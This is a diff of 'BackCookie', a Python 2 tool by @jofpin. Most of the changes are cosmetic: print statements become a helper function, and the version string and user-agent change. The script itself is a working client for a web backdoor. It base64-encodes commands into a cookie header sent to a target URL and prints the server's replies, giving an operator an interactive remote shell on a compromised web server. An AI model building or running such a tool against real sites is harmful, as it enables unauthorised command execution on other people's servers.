@@ -26,7 +26,7 @@ from sys import argv                          #
 # Backcookie is like the people who finds the love of his life every 2 months. #
 ################################################################################
 #
-#BackCookie
+# BackCookie
 #
 if "linux" in sys.platform:
 	os.system("clear")
@@ -35,7 +35,7 @@ elif "win" in sys.platform:
 else:
     pass
 
-_version_ = "1.0.3"
+_version_ = "1.0.2"
 
 # class of header, encode and colors
 class core:
@@ -45,17 +45,21 @@ class core:
     eb = 'base64'
     cl = {"blue": "\033[94m", "red": "\033[91m", "green": "\033[92m", "white": "\033[0m", "yellow": "\033[93m"}
 
+# Simplification
+def go(value):
+	print value
+
 def Error():
-	print core.cl['white'] + "\t\t-------------" + core.cl['red'] + core.bc + core.cl['white'] + "------------"
-	print "\t\t+             Status              +"
-	print "\t\t+             sorry :(            +"
-	print "\t\t-----------------------------------\n\n"
-	print core.cl['blue'] + "[-] " + core.cl['red']  + "Error:" +  core.cl['yellow'] + " " + "Connection! \n" + core.cl['white']
+	go(core.cl['white'] + "\t\t-------------" + core.cl['red'] + core.bc + core.cl['white'] + "------------")
+	go("\t\t+             Status              +")
+	go("\t\t+             sorry :(            +")
+	go("\t\t-----------------------------------\n\n")
+	go(core.cl['blue'] + "[-] " + core.cl['red']  + "Error:" +  core.cl['yellow'] + " " + "Connection! \n" + core.cl['white'])
 	exit(0)
 
 def backcookie(command, host, cookie, vcmd):
 	headers = {
-	           core.ua: 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1)', 
+	           core.ua: 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0', 
 	           core.ck: cookie + '=' + command.encode(core.eb)
 	          }
 	try:
@@ -64,60 +68,68 @@ def backcookie(command, host, cookie, vcmd):
 	except:
 		Error()
 	if v[0] == "0" or vcmd == "command": # vcmd > validate command
-		print core.cl['blue'] + r.text.strip() + core.cl['white']
-	else:
-		Error()
+		go(core.cl['blue'] + r.text.strip() + core.cl['white'])
+	#else:
+		#Error()
 
 def shell(host, cookie):
 	backcookie("cd",host,cookie,"")
 
-	print core.cl['white'] + "\t\t-------------" + core.cl['red'] + core.bc + core.cl['white'] + "------------"
-	print "\t\t+      Developed by: @jofpin      +"
-	print "\t\t+             To play             +"
-	print "\t\t-----------------------------------\n\n"
-	print core.cl['green'] + "[+] " + core.cl['blue']  + "Happy hacking" + core.cl['white']
-	print core.cl['green'] + "[+] " + core.cl['blue']  + "Sometimes it is not positive, but sometimes if!\n" + core.cl['white']
+	go(core.cl['white'] + "\t\t-------------" + core.cl['red'] + core.bc + core.cl['white'] + "------------")
+	go("\t\t+      Developed by: @jofpin      +")
+	go("\t\t+             To play             +")
+	go("\t\t-----------------------------------\n\n")
+	go(core.cl['green'] + "[+] " + core.cl['blue']  + "Happy hacking" + core.cl['white'])
+	go(core.cl['green'] + "[+] " + core.cl['blue']  + "Sometimes it is not positive, but sometimes if!\n" + core.cl['white'])
 
-	opu = urllib.urlopen(host) # opu > openurl
-	server = opu.headers.get("server")
+	# Open url
+	openurl = urllib.urlopen(host)
+
+	# Info server
+	server = openurl.headers.get("server")
+
+	# The domain
 	domain = host.split("/")[2]
+
+	# Your nick in console
+	nick = raw_input(core.cl['blue'] + "[!] " + core.cl['white']  + "Your nick: " + core.cl['white'])
 
 	while True:
 
-		command = raw_input("@" + "pwned:~$ ")
-		if command != "binfo": #Information of conecction!
-			backcookie(command,host,cookie,"command")
+		command = raw_input(nick + "@" + domain + ":~$ ")
+		if command != "binfo": # Information of conecction!
+			backcookie(command, host, cookie, "command")
 		else:
-			print "\n"
-			print core.cl['yellow'] + "[*] " + core.cl['white']  + "Information" + core.cl['white']
-			print core.cl['yellow'] + "[!] " + core.cl['green']  + "Host: " + core.cl['blue'] + domain + core.cl['white']
-			print core.cl['yellow'] + "[!] " + core.cl['green']  + "WebServer: " + core.cl['blue'] + server + core.cl['white']
-			print core.cl['yellow'] + "[!] " + core.cl['green']  + "Target: " + core.cl['blue'] + host + core.cl['white']
-			print core.cl['yellow'] + "[!] " + core.cl['green']  + "Cookie: " + core.cl['blue'] + cookie + core.cl['white']
-			print "\n"
+			go("\n")
+			go(core.cl['yellow'] + "[*] " + core.cl['white']  + "Information" + core.cl['white'])
+			go(core.cl['yellow'] + "[!] " + core.cl['green']  + "Host: " + core.cl['blue'] + domain + core.cl['white'])
+			go(core.cl['yellow'] + "[!] " + core.cl['green']  + "WebServer: " + core.cl['blue'] + server + core.cl['white'])
+			go(core.cl['yellow'] + "[!] " + core.cl['green']  + "Target: " + core.cl['blue'] + host + core.cl['white'])
+			go(core.cl['yellow'] + "[!] " + core.cl['green']  + "Cookie: " + core.cl['blue'] + cookie + core.cl['white'])
+			go("\n")
 
-		command = raw_input("@" + "pwned:~$ ")
-		if command != "exit": #exit console backcookie
-			backcookie(command,host,cookie,"command")
+		command = raw_input(nick + "@" + domain + ":~$ ")
+		if command != "exit": # exit console backcookie
+			backcookie(command, host, cookie, "command")
 		else:
-			print "\t\t-------------" + core.cl['blue'] + "Developer" + core.cl['white'] + "------------"
-			print "\t\t+        José Pino (Fraph)       +"
-			print "\t\t+       Security researcher      +"
-			print "\t\t+            @jofpin             +"
-			print "\t\t----------------------------------\n\n"
-			print core.cl['green'] + "[!] " + core.cl['blue'] + "Version:" + " " + core.cl['yellow'] + _version_ + core.cl['white']
-			print core.cl['blue'] + "[-] " + core.cl['red'] + core.bc + " OFF\n" + core.cl['white']
+			go("\t\t-------------" + core.cl['blue'] + "Developer" + core.cl['white'] + "------------")
+			go("\t\t+        Jose Pino (Fraph)       +")
+			go("\t\t+       Security researcher      +")
+			go("\t\t+            @jofpin             +")
+			go("\t\t----------------------------------\n\n")
+			go(core.cl['green'] + "[!] " + core.cl['blue'] + "Version:" + " " + core.cl['yellow'] + _version_ + core.cl['white'])
+			go(core.cl['blue'] + "[-] " + core.cl['red'] + core.bc + " OFF\n" + core.cl['white'])
 			break
 
 def main():
-	parser = optparse.OptionParser("python" + " " + "%prog -u <<URL>> -c <<Cookie>>", version="1.0.3")
+	parser = optparse.OptionParser("python" + " " + "%prog -u <<URL>> -c <<Cookie>>", version="1.0.2")
 	parser.add_option('-u', dest="Url", type="string", help="specify hostname to run on")
 	parser.add_option('-c', dest="Cookie", type="string", help="specify Cookie")
 	(options, args) = parser.parse_args()
 	host = options.Url
 	cookie = options.Cookie
 	if host and cookie:
-		shell(host,cookie)
+		shell(host, cookie)
 	else:
 		parser.print_help()
 		exit(0)
@@ -129,4 +141,4 @@ if __name__ == "__main__":
         	sys.exit(core.cl['blue'] + "\n\n[-] " + core.cl['green'] + "Status: " + core.cl['red'] + "close!\n" + core.cl['white']) #Ctrl + c = close
                 pass
         except Exception as ke:
-        	sys.exit(core.cl['red'] + "Error: " + core.cl['blue'] + "%s" % ke + core.cl['white']) #Result of error
+        	sys.exit(core.cl['red'] + "Error: " + core.cl['blue'] + "%s" % ke + core.cl['white']) # Result of error
